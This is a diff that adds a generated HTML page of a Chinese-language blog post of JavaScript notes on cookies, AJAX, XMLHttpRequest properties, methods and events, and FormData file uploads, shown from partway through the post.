+注意, Cookie 中的 = 两边不能有空格.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org24f617a" class="outline-3">
+<h3 id="org24f617a">删除 Cookie</h3>
+<div class="outline-text-3" id="text-org24f617a">
+<p>
+只有一个办法删除 Cookie, 那就是把它的 Expires 属性设为一个过去的日期.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org41294dd" class="outline-3">
+<h3 id="org41294dd">发送 Cookie</h3>
+<div class="outline-text-3" id="text-org41294dd">
+<p>
+浏览器向服务器发送 HTTP 请求时, 每个请求都会自动带上相应的 Cookie(如果有的话). 即, 把服务器保存在浏览器的信息又发回给了服务器. 如:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</pre>
+</div>
+<p>
+这里发送了两个 Cookie.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org455291d" class="outline-2">
+<h2 id="org455291d">AJAX</h2>
+<div class="outline-text-2" id="text-org455291d">
+</div>
+<div id="outline-container-org24d5216" class="outline-3">
+<h3 id="org24d5216">概述</h3>
+<div class="outline-text-3" id="text-org24d5216">
+<p>
+浏览器与服务器之间采用HTTP协议通信. 1999年, 微软公司首次允许JavaScript脚本向服务器发起HTTP请求. AJAX成为脚本发起HTTP通信的代名词.
+</p>
+
+<p>
+AJAX包括以下几个步骤:
+</p>
+<ul class="org-ul">
+<li>创建AJAX对象</li>
+<li>发出HTTP请求</li>
+<li>接收服务器传回的数据</li>
+<li>更新网页数据</li>
+</ul>
+
+<p>
+即: AJAX通过原生的XMLHttpRequest对象发出HTTP请求, 得到服务器返回的数据后, 再进行处理.
+</p>
+
+<p>
+AJAX可以是同步请求, 也可以是异步请求, 多数情况下是异步请求, 因为同步会对浏览器有"堵塞效应".
+</p>
+</div>
+</div>
+
+<div id="outline-container-org63f21d9" class="outline-3">
+<h3 id="org63f21d9">XMLHttpRequest对象</h3>
+<div class="outline-text-3" id="text-org63f21d9">
+<p>
+XMLHttpRequest对象用来在浏览器与服务器之间传送数据.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-JavaScript">var ajax = new XMLHttpRequest();
+ajax.open('GET', 'http://www.example.com/page.php', true);
+ajax.onreadystatechange = handleStateChange;  // 指定回调函数监听通信状态(readyState属性)
+</pre>
+</div>
+<p>
+拿到服务器返回的数据, AJAX不会刷新整个网页, 而是只更新相关部分, 从而不打断用户正在做的事情.
+</p>
+
+<p>
+XMLHttpRequest对象的典型用法:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var xhr = new XMLHttpRequest();
+
+// 指定通信过程中状态改变时的回调函数
+xhr.onreadystatechange = function(){
+  // 通信成功时，状态值为4
+  if (xhr.readyState === 4){
+    if (xhr.status === 200){
+      console.log(xhr.responseText);
+    } else {
+      console.error(xhr.statusText);
+    }
+  }
+};
+
+xhr.onerror = function (e) {
+  console.error(xhr.statusText);
+};
+
+// open方式用于指定HTTP动词、请求的网址、是否异步
+xhr.open('GET', '/endpoint', true);
+
+// 发送HTTP请求
+xhr.send(null);
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgccc13c8" class="outline-3">
+<h3 id="orgccc13c8">XMLHttpRequest的属性</h3>
+<div class="outline-text-3" id="text-orgccc13c8">
+</div>
+<div id="outline-container-orge076f73" class="outline-4">
+<h4 id="orge076f73">readyState</h4>
+<div class="outline-text-4" id="text-orge076f73">
+<p>
+只读, 表示XMLHttpRequest请求当前所处的状态.
+</p>
+
+<ul class="org-ul">
+<li>0: 对应常量UNSENT, 表示XMLHttpRequest实例已经生成, 但是open()方法还没有被调用.</li>
+<li>1: 对应常量OPENED, 表示send()方法还没有被调用, 仍然可以使用setRequestHeader(), 设定HTTP请求的头信息.</li>
+<li>2: 对应常量HEADERS_RECEIVED, 表示send()方法已经执行, 并且头信息和状态码已经收到.</li>
+<li>3: 对应常量LOADING, 表示正在接收服务器传来的body部分的数据, 如果responseType属性是text或者空字符串, responseText就会包含已经收到的部分信息.</li>
+<li>4: 对应常量DONE, 表示服务器数据已经完全接收, 或者本次接收已经失败了.</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgf273860" class="outline-4">
+<h4 id="orgf273860">onreadystatechange</h4>
+<div class="outline-text-4" id="text-orgf273860">
+<p>
+onreadystatechange属性指向一个回调函数, 当readystatechange事件发生的时候, 这个回调函数就会调用, 并且XMLHttpRequest实例的readyState属性也会发生变化.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org868101e" class="outline-4">
+<h4 id="org868101e">response</h4>
+<div class="outline-text-4" id="text-org868101e">
+<p>
+只读, 返回接收到的数据体.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orga9d383c" class="outline-4">
+<h4 id="orga9d383c">responseType</h4>
+<div class="outline-text-4" id="text-orga9d383c">
+<p>
+指定服务器返回的数据类型.
+</p>
+
+<p>
+类型有:
+"": 字符串(默认值); 
+"arraybuffer"; 
+"blob": 适合读取二进制数据, 如图片
+"document": 适合返回XML文档的情况
+"json";
+"text": 适用于大多数情况
+</p>
+
+<div class="org-src-container">
+<pre class="src src-JavaScript">var xhr = new XMLHttpRequest();
+xhr.open('GET', '/path/to/image.png', true);
+xhr.responseType = 'blob';
+
+xhr.onload = function(e) {
+  if (this.status == 200) {
+    var blob = new Blob([this.response], {type: 'image/png'});
+    // 或者
+    var blob = oReq.response;
+  }
+};
+
+xhr.send();
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org17e9d85" class="outline-4">
+<h4 id="org17e9d85">responseText</h4>
+<div class="outline-text-4" id="text-org17e9d85">
+<p>
+只读, 返回从服务器接收到的字符串.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var data = ajax.responseText;
+data = JSON.parse(data);
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgce1774d" class="outline-4">
+<h4 id="orgce1774d">responseXML</h4>
+<div class="outline-text-4" id="text-orgce1774d">
+<p>
+只读, 返回从服务器接收到的Document对象.
+</p>
+
+<p>
+如果本次请求没有成功, 或者数据不完整, 或者不能被解析为XML或HTML, 该属性等于null.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgdc6d57b" class="outline-4">
+<h4 id="orgdc6d57b">status</h4>
+<div class="outline-text-4" id="text-orgdc6d57b">
+<p>
+只读, 返回本次请求所得到的HTTP状态码.
+</p>
+
+<p>
+基本上, 只有2xx和304的状态码, 表示服务器返回是正常状态.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">if (ajax.readyState == 4) {
+  if ( (ajax.status &gt;= 200 &amp;&amp; ajax.status &lt; 300)
+    || (ajax.status == 304) ) {
+    // Handle the response.
+  } else {
+    // Status error!
+  }
+}
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org96917fc" class="outline-4">
+<h4 id="org96917fc">statusText</h4>
+<div class="outline-text-4" id="text-org96917fc">
+<p>
+与status类似, 但信息类似"200 OK".
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgb94a637" class="outline-4">
+<h4 id="orgb94a637">timeout</h4>
+<div class="outline-text-4" id="text-orgb94a637">
+<p>
+timeout属性等于一个整数, 表示多少毫秒后, 如果请求仍然没有得到结果, 就会自动终止. 如果该属性等于0, 就表示没有时间限制.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgcf9dab4" class="outline-4">
+<h4 id="orgcf9dab4">事件监听接口</h4>
+<div class="outline-text-4" id="text-orgcf9dab4">
+<p>
+XMLHttpRequest第一版只能对 <code>onreadystatechange</code> 这一事件指定回调函数. 第二版允许对更多的事件指定回调函数.
+</p>
+
+<p>
+onloadstart 请求发出
+onprogress 正在发送和加载数据
+onabort 请求被中止，比如用户调用了abort()方法
+onerror 请求失败
+onload 请求成功完成
+ontimeout 用户指定的时限到期，请求还未完成
+onloadend 请求完成，不管成果或失败
+</p>
+
+<div class="org-src-container">
+<pre class="src src-JavaScript">xhr.onload = function() {
+ var responseText = xhr.responseText;
+ console.log(responseText);
+ // process the response.
+};
+
+xhr.onerror = function() {
+  console.log('There was an error!');
+};
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgfbabf77" class="outline-4">
+<h4 id="orgfbabf77">withCredentials</h4>
+<div class="outline-text-4" id="text-orgfbabf77">
+<p>
+withCredentials属性是一个布尔值, 表示跨域请求时, 用户信息（比如Cookie和认证的HTTP头信息）是否会包含在请求之中, 默认为false. 即向example.com发出跨域请求时, 不会发送example.com设置在本机上的Cookie（如果有的话）.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orge3c0dc9" class="outline-3">
+<h3 id="orge3c0dc9">XMLHttpRequest的方法</h3>
+<div class="outline-text-3" id="text-orge3c0dc9">
+</div>
+<div id="outline-container-orgb9e1730" class="outline-4">
+<h4 id="orgb9e1730">abort()</h4>
+<div class="outline-text-4" id="text-orgb9e1730">
+<p>
+用来终止已经发出的HTTP请求.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">ajax.open('GET', 'http://www.example.com/page.php', true);
+var ajaxAbortTimer = setTimeout(function() {
+  if (ajax) {
+    ajax.abort();
+    ajax = null;
+  }
+}, 5000);
+</pre>
+</div>
+<p>
+发出5s之后终止AJAX请求.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgafa0897" class="outline-4">
+<h4 id="orgafa0897">getAllResponseHeaders()</h4>
+<div class="outline-text-4" id="text-orgafa0897">
+<p>
+返回服务器发来的所有HTTP头信息.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org2de020f" class="outline-4">
+<h4 id="org2de020f">getResponseHeader()</h4>
+<div class="outline-text-4" id="text-org2de020f">
+<p>
+返回HTTP头信息指定字段的值.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org3f262b6" class="outline-4">
+<h4 id="org3f262b6">open()</h4>
+<div class="outline-text-4" id="text-org3f262b6">
+<p>
+指定发送HTTP请求的参数. 有5个参数:
+</p>
+
+<p>
+method：表示HTTP动词，比如“GET”、“POST”、“PUT”和“DELETE”。
+url: 表示请求发送的网址。
+async: 格式为布尔值，默认为true，表示请求是否为异步。如果设为false，则send()方法只有等到收到服务器返回的结果，才会有返回值。
+user：表示用于认证的用户名，默认为空字符串。
+password：表示用于认证的密码，默认为空字符串。
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgf50152d" class="outline-4">
+<h4 id="orgf50152d">send()</h4>
+<div class="outline-text-4" id="text-orgf50152d">
+<p>
+send方法用于实际发出HTTP请求。如果不带参数，就表示HTTP请求只包含头信息，也就是只有一个URL，典型例子就是GET请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是POST请求。
+</p>
+
+<p>
+GET:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">ajax.open('GET'
+  , 'http://www.example.com/somepage.php?id=' + encodeURIComponent(id)
+  , true
+);
+
+// 等同于
+var data = 'id=' + encodeURIComponent(id));
+ajax.open('GET', 'http://www.example.com/somepage.php', true);
+ajax.send(data);
+</pre>
+</div>
+
+<p>
+POST:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var data = 'email='
+  + encodeURIComponent(email)
+  + '&amp;password='
+  + encodeURIComponent(password);
+ajax.open('POST', 'http://www.example.com/somepage.php', true);
+ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+ajax.send(data);
+</pre>
+</div>
+
+<p>
+FormData类型可以用于构造表单数据.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var formData = new FormData();
+
+formData.append('username', '张三');
+formData.append('email', 'zhangsan@example.com');
+formData.append('birthDate', 1940);
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "/register");
+xhr.send(formData);
+</pre>
+</div>
+
+<p>
+上面的代码构造了一个formData对象，然后使用send方法发送。它的效果与点击下面表单的submit按钮是一样的。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-JavaScript">&lt;form id='registration' name='registration' action='/register'&gt;
+    &lt;input type='text' name='username' value='张三'&gt;
+    &lt;input type='email' name='email' value='zhangsan@example.com'&gt;
+    &lt;input type='number' name='birthDate' value='1940'&gt;
+    &lt;input type='submit' onclick='return sendForm(this.form);'&gt;
+&lt;/form&gt;
+</pre>
+</div>
+
+<p>
+FormData也可以由现有表单构造生成。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-JavaScript">var formElement = document.querySelector("form");
+var request = new XMLHttpRequest();
+request.open("POST", "submitform.php");
+request.send(new FormData(formElement));
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgad417e1" class="outline-4">
+<h4 id="orgad417e1">setRequestHeader()</h4>
+<div class="outline-text-4" id="text-orgad417e1">
+<p>
+用于设置HTTP头信息。该方法必须在open()之后、send()之前调用。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org5d097f0" class="outline-4">
+<h4 id="org5d097f0">overrideMimeType()</h4>
+</div>
+</div>
+
+<div id="outline-container-org7af3614" class="outline-3">
+<h3 id="org7af3614">XMLHttpRequest的事件</h3>
+<div class="outline-text-3" id="text-org7af3614">
+</div>
+<div id="outline-container-org992165f" class="outline-4">
+<h4 id="org992165f">readyStateChange事件</h4>
+</div>
+
+<div id="outline-container-org1aa2eac" class="outline-4">
+<h4 id="org1aa2eac">progress事件</h4>
+<div class="outline-text-4" id="text-org1aa2eac">
+<p>
+上传文件时，XMLHTTPRequest对象的upload属性有一个progress，会不断返回上传的进度。
+</p>
+
+<p>
+假定网页上有一个progress元素:
+</p>
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;progress min="0" max="100" value="0"&gt;0% complete&lt;/progress&gt;
+</pre>
+</div>
+
+<p>
+文件上传时，对upload属性指定progress事件回调函数，即可获得上传的进度。
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">function upload(blobOrFile) {
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', '/server', true);
+  xhr.onload = function(e) { ... };
+
+  // Listen to the upload progress.
+  var progressBar = document.querySelector('progress');
+  xhr.upload.onprogress = function(e) {
+    if (e.lengthComputable) {
+      progressBar.value = (e.loaded / e.total) * 100;
+      progressBar.textContent = progressBar.value; // Fallback for unsupported browsers.
+    }
+  };
+
+  xhr.send(blobOrFile);
+}
+
+upload(new Blob(['hello world'], {type: 'text/plain'}));
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org44dbf7f" class="outline-4">
+<h4 id="org44dbf7f">load事件、error事件、abort事件</h4>
+<div class="outline-text-4" id="text-org44dbf7f">
+<p>
+load事件表示服务器传来的数据接收完毕，error事件表示请求出错，abort事件表示请求被中断。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org2a75551" class="outline-4">
+<h4 id="org2a75551">loadend事件</h4>
+<div class="outline-text-4" id="text-org2a75551">
+<p>
+abort、load和error这三个事件，会伴随一个loadend事件，表示请求结束，但不知道其是否成功。
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org7a31c9d" class="outline-3">
+<h3 id="org7a31c9d">文件上传</h3>
+<div class="outline-text-3" id="text-org7a31c9d">
+<p>
+HTML网页的&lt;form&gt;元素能够以四种格式，向服务器发送数据。
+</p>
+
+<ul class="org-ul">
+<li>使用POST方法，将enctype属性设为application/x-www-form-urlencoded，这是默认方法。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-JavaScript">&lt;form action="register.php" method="post" onsubmit="AJAXSubmit(this); return false;"&gt;
+&lt;/form&gt;
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>使用POST方法，将enctype属性设为text/plain。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-JavaScript">&lt;form action="register.php" method="post" enctype="text/plain" onsubmit="AJAXSubmit(this); return false;"&gt;
+&lt;/form&gt;
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>使用POST方法，将enctype属性设为multipart/form-data。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-JavaScript">&lt;form action="register.php" method="post" enctype="multipart/form-data" onsubmit="AJAXSubmit(this); return false;"&gt;
+&lt;/form&gt;
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>使用GET方法，enctype属性将被忽略。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-JavaScript">&lt;form action="register.php" method="get" onsubmit="AJAXSubmit(this); return false;"&gt;
+&lt;/form&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgeb69aef" class="outline-4">
+<h4 id="orgeb69aef">文件上传</h4>
+<div class="outline-text-4" id="text-orgeb69aef">
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;form id="file-form" action="handler.php" method="POST"&gt;
+  &lt;input type="file" id="file-select" name="photos[]" multiple/&gt;
+  &lt;button type="submit" id="upload-button"&gt;上传&lt;/button&gt;
+&lt;/form&gt;
+</pre>
+</div>
+<p>
+file控件的multiple属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。
+</p>
+
+<p>
+把选中的文件添加到表单对象上.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var fileSelect = document.getElementById('file-select');
+var files = fileSelect.files;
+var formData = new FormData();
+
+for (var i = 0; i &lt; files.length; i++) {
+  var file = files[i];
+
+  if (!file.type.match('image.*')) {
+    continue;
+  }
+
+  formData.append('photos[]', file, file.name);
+}
+</pre>
+</div>
+
+<p>
+使用Ajax方法向服务器上传文件:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var xhr = new XMLHttpRequest();
+
+xhr.open('POST', 'handler.php', true);
+
+xhr.onload = function () {
+  if (xhr.status !== 200) {
+    alert('An error occurred!');
+  }
+};
+
+xhr.send(formData);
+</pre>
+</div>
+
+<p>
+除了使用FormData接口上传，也可以直接使用File API上传:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var file = document.getElementById('test-input').files[0];
+var xhr = new XMLHttpRequest();
+
+xhr.open('POST', 'myserver/uploads');
+xhr.setRequestHeader('Content-Type', file.type);
+xhr.send(file);
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+<div>
+        <div class="post-meta">
+            <span title="post date" class="post-info">2018-03-19</span>
+            <span title="last modification date" class="post-info">2018-05-13</span>
+            <span title="tags" class="post-info">:<a href="https://pinvondev.github.io/tags/web">Web</a>:</span>
+            <span title="author" class="post-info"><a href="mailto:pinvon@Inspiron">Pinvon</a></span>
+        </div>
+    <script src="https://pinvondev.github.io/media/js/jquery-2.1.3.min.js"></script>
+        <section>
+            <h1>Comments</h1>
+            <div id="comment-wrap">
+                    <a class="disqus_label">使用 Disqus 评论</a>
+    </ul>
+        <div id="disqus_thread"></div>
+        <script type="text/javascript">
+         //var disqus_developer = 1;
+         var preempt_signal=false;
+         var disqus_identifier = "/blog/2018/03/19/javascript笔记--浏览器环境概述";
+         var disqus_url = "https://pinvondev.github.io/blog/2018/03/19/javascript笔记--浏览器环境概述";
+         var disqus_shortname = 'pinvon';
+         /* * * DON'T EDIT BELOW THIS LINE * * */
+         (function() {
+             var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+             dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+             (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+             $('#disqus_thread').css('display','none');
+         })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    <script>
+     /* comments */
+     var ego_disqus_thread=$('#disqus_thread');
+     var ego_ds_label=$('.ds-thread');
+     $('.disqus_label').click(function(){
+         ego_disqus_thread.show();
+         ego_ds_label.hide();
+     });
+     $('.ds-label').click(function(){
+         ego_disqus_thread.hide();
+         ego_ds_label.show();
+     });
+    </script>
+        </section>
+    <script src="https://pinvondev.github.io/media/js/main.js"></script>
+    <div class="footer">
+        <p>Generated by <a href="http://www.gnu.org/software/emacs/">Emacs</a> 25.x(<a href="http://orgmode.org">Org mode</a> 9.x)</p>
+        <p>
+            Copyright &copy; 2014 - <span id="footerYear"></span> <a href="mailto:pinvon@Inspiron">Pinvon</a>
+            &nbsp;&nbsp;-&nbsp;&nbsp;
+            Powered by <a href="https://github.com/emacs-china/ego" target="_blank">EGO</a><br/>
+            <a href="http://creativecommons.org/licenses/by-sa/3.0/" rel="license"><img src="http://i.creativecommons.org/l/by-sa/3.0/88x31.png" style="border-width:0" alt="Creative Commons License" class="center"></a>
+            <script type="text/javascript">document.getElementById("footerYear").innerHTML = (new Date()).getFullYear();</script>
+        </p>
+    </div>
+            </div>
+            <script type="text/javascript"
+                    src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_SVG">
+            </script>
+            <script type="text/x-mathjax-config">
+             MathJax.Hub.Config({ TeX: { equationNumbers: {autoNumber: "AMS"} } });
+            </script>
+            <script type="text/javascript" src="/media/js/particle.js"></script>
+            <script type="text/javascript" src="/media/js/love.js"></script>
+</div>
+
+  </div></body>
+</html>
